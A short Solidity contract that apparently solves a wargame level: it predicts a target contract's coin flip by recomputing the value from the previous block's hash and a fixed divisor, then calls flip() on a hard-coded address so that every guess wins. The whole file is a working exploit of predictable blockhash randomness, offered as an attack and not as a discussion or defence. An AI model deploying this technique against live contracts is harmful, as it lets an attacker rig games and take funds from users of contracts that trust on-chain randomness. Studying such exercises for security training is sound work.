// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAttackCoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip {
    // Address of instance obtained
  address coinFlipAddress = 0x1eD3E2a128e7b7c7316417Fe34fFd88dB8139276;
  IAttackCoinFlip coinFlipContract = IAttackCoinFlip(coinFlipAddress);

  function attackFlip(bool _guess) public {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    (side == _guess) ? coinFlipContract.flip(_guess) : coinFlipContract.flip(!_guess);
  }
}